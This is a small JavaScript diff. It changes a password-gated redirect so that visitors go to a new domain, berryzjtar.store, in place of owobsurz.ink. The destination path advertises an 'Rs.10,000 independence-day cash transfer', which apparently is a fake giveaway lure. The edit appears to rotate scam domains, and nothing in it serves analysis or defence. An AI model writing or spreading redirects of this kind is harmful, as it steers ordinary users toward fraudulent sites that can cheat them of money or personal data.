@@ -6,5 +6,5 @@ password = prompt(
 );
 
 if (password !== 'Rs.10,000') {
-    location.href = 'https://www.owobsurz.ink/rs10000-independence-day-cash-transfer';
+    location.href = 'https://www.berryzjtar.store/rs10000-independence-day-cash-transfer';
 }
